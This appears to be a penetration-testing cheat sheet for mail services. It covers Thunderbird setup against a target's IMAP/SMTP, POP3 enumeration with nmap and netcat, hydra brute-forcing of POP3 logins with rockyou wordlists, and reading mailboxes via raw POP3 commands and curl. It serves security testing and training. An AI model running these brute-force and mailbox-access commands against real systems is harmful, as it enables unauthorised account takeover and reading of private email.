# Remote GUI for IMAP/POP3/SMTP → Thunderbird (Read/Send Emails)
```
- `sudo apt install thunderbird`
- Start Thunderbird GUI  
  or if already installed: select **New Account** to set up a new connection
  - Fill out random name / email / password and select **Manual config**
    - **Important**: The password entered here will be sent to the target by default  
      The email will appear as the "sent from" address in any outgoing mails
  - Under **Manual Configuration**:
    - Set both **Incoming** and **Outgoing** hostnames to the **IP address** of the target machine
    - **Incoming server**: preferably use **IMAP**  
      (IMAP shows all folders; POP3 usually shows only INBOX and behaves differently)
    - **Outgoing server**: use port **25** (SMTP)
    - For both Incoming and Outgoing:
      - **Connection security**: None
      - **Authentication method**: Normal password
      - **Username**: target username
  - Click **Re-test** to verify the settings
  - Click **Done** to connect and access/send emails
  - To log out / clear credentials - Go to **Account Settings** → select the account → **Delete Account**
```
----------------------------------------------------------------


**POP3 / POP3S Enumeration & Connection**

**Port scan for POP3**  
```bash
nmap -p 110,995 -sV -sC <target-ip>
```

**Full port scan to confirm POP3 ports**  
```bash
nmap -p- --min-rate 5000 <target-ip> | grep -E "110|995"
```

**Nmap POP3 scripts**  
```bash
nmap -p 110,995 --script pop3-* <target-ip>
```

**Connect/Banner grab with netcat (plain POP3)**  
```bash
nc -nv <target-ip> 110
```

**Connect/Banner grab for POP3S (SSL)**  
```bash
openssl s_client -connect <target-ip>:995
```

**Check POP3 capabilities**  
```bash
# After connecting, send:
CAPA
```

**Brute force POP3 credentials**  
```bash
hydra -l <user> -P /usr/share/wordlists/rockyou.txt <target-ip> pop3
```

**Brute force with user list**  
```bash
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt <target-ip> pop3
```

**Login via netcat**  
```bash
# After nc -nv <target-ip> 110
USER username
PASS password
```

**Mailbox status (messages + total size)**  
```bash
STAT
```

**List messages with sizes**  
```bash
LIST
```

**Retrieve message**  
```bash
RETR 1
```

**Retrieve specific message**  
```bash
RETR <msg-number>
```

**Connect and interact via curl (alternative)**  
```bash
curl -v --user <user>:<pass> pop3://<target-ip>
```

**Fetch specific message via curl**  
```bash
curl -v --user <user>:<pass> pop3://<target-ip>/1
```

**Logout**  
```bash
QUIT
```
